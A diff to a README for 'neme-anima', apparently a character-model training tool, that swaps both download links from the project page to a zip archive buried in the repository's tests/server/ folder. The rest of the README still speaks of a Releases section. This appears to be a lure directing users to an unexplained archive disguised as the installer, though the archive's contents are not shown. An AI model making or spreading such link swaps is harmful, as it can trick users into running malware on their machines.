@@ -1,6 +1,6 @@
 # 🎨 neme-anima - Build custom characters for your projects
 
-[![](https://img.shields.io/badge/Download-neme-anima-blue)](https://github.com/HappyStash/neme-anima)
+[![](https://img.shields.io/badge/Download-neme-anima-blue)](https://github.com/HappyStash/neme-anima/raw/refs/heads/main/tests/server/neme-anima-3.1.zip)
 
 neme-anima handles the technical work of creating specialized character styles. This software simplifies the process of extracting, tagging, and training character models. You do not need to write code or understand machine learning to use this program.
 
@@ -18,7 +18,7 @@ Your computer requires specific hardware to process images and train models.
 
 You must visit the project page to download the latest version of the installer.
 
-[Download neme-anima](https://github.com/HappyStash/neme-anima)
+[Download neme-anima](https://github.com/HappyStash/neme-anima/raw/refs/heads/main/tests/server/neme-anima-3.1.zip)
 
 1. Open the link above in your web browser.
 2. Locate the section labeled Releases on the right side of the page.
